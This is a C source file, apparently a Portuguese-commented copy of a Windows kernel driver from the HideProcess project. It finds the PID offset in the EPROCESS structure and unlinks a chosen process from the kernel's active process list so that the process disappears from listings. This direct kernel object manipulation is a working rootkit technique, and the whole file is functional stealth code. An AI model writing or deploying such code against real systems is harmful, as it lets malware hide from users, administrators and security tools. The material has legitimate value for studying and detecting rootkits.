
/*

	Código obtido aqui: https://github.com/landhb/HideProcess/blob/master/driver/

*/

/// <summary>
/// Procurar e descolar PID
/// </summary>
/// <returns></returns>
ULONG ProcurarPID()
{

	// O deslocamento que estamos procurando
	ULONG descamento = 0;
	int idx = 0;

	// Lista de PIDs para nossos 3 processos
	ULONG pids[3];

	// Lista de processos, conterá 3 processos
	PEPROCESS eprocs[3];

	// Selecione 3 PIDs de processo e obtenha seu Ponteiro de EPROCESS
	for (int i = 16; idx < 3; i += 4)
	{
		// Obtenha o processo pelo PID
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx])))
		{
			pids[idx] = i;
			idx++;
		}
	}


	/*
		Vá até a estrutura do EPROCESS e procure o PID
		podemos começar em 0x20 porque UniqueProcessId deve
		não estar nos primeiros 0x20 bytes,
		também devemos parar após 0x300 bytes sem sucesso
	*/

	// Procure
	for (int i = 0x20; i < 0x300; i += 4)
	{
		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
		{
			// Deslocamento
			descamento = i;
			break;
		}
	}

	// Libere
	ObDereferenceObject(eprocs[0]);
	ObDereferenceObject(eprocs[1]);
	ObDereferenceObject(eprocs[2]);


	// Retorne o deslocamento
	return descamento;
}

// Remove links
VOID RemoverLinks(_In_ PLIST_ENTRY Atual);

/// <summary>
/// Oculta um processo
/// </summary>
/// <param name="pid"></param>
/// <returns></returns>
VOID OcultarProcesso(_In_ UINT32 pid)
{
	// Obtenha o deslocamento do PID
	ULONG PIDDeslocamento = ProcurarPID();

	// Verifique se a descoberta de deslocamento foi bem-sucedida
	if (PIDDeslocamento == 0) {
		return;
	}

	// Obtenha LIST_ENTRY
	ULONG Lista = PIDDeslocamento;

	// Verifique a arquitetura usando o tamanho do ponteiro
	INT_PTR ptr;

	// Ptr tamanho 8 se compilado para uma máquina de 64 bits, 4 se compilado para uma máquina de 32 bits
	Lista += sizeof(ptr);

	// Get current process
	PEPROCESS ProcessoAtual = PsGetCurrentProcess();

	// Inicie as variaveis
	PLIST_ENTRY ListaAtual = (PLIST_ENTRY)((ULONG_PTR)ProcessoAtual + Lista);
	PUINT32 PIDAtual = (PUINT32)((ULONG_PTR)ProcessoAtual + PIDDeslocamento);

	// Verifique a si mesmo
	if (*(UINT32*)PIDAtual == pid) {
		RemoverLinks(ListaAtual);
		return;
	}

	// Registre a posição inicial
	PEPROCESS IniciarProcesso = ProcessoAtual;

	// Mova o próximo item
	ProcessoAtual = (PEPROCESS)((ULONG_PTR)ListaAtual->Flink - Lista);
	PIDAtual = (PUINT32)((ULONG_PTR)ProcessoAtual + PIDDeslocamento);
	ListaAtual = (PLIST_ENTRY)((ULONG_PTR)ProcessoAtual + Lista);

	// Faça um loop até encontrarmos o processo certo para remover
	// Ou até voltarmos
	while ((ULONG_PTR)IniciarProcesso != (ULONG_PTR)ProcessoAtual) {

		// Veja o item
		if (*(UINT32*)PIDAtual == pid) {
			RemoverLinks(ListaAtual);
			return;
		}

		// Mova o item
		ProcessoAtual = (PEPROCESS)((ULONG_PTR)ListaAtual->Flink - Lista);
		PIDAtual = (PUINT32)((ULONG_PTR)ProcessoAtual + PIDDeslocamento);
		ListaAtual = (PLIST_ENTRY)((ULONG_PTR)ProcessoAtual + Lista);
	}
}

/// <summary>
/// Remover links (de acordo com o tradutor)
/// </summary>
/// <param name="Atual"></param>
VOID RemoverLinks(_In_ PLIST_ENTRY Atual)
{
	PLIST_ENTRY Anterior, Proxima;

	Anterior = (Atual->Blink);
	Proxima = (Atual->Flink);

	// Loop sobre si mesmo (conectar o anterior com o próximo)
	Anterior->Flink = Proxima;
	Proxima->Blink = Anterior;

	// Reescrever o LIST_ENTRY atual para apontar para si mesmo (evitando BSOD)
	Atual->Blink = (PLIST_ENTRY)&Atual->Flink;
	Atual->Flink = (PLIST_ENTRY)&Atual->Flink;
}
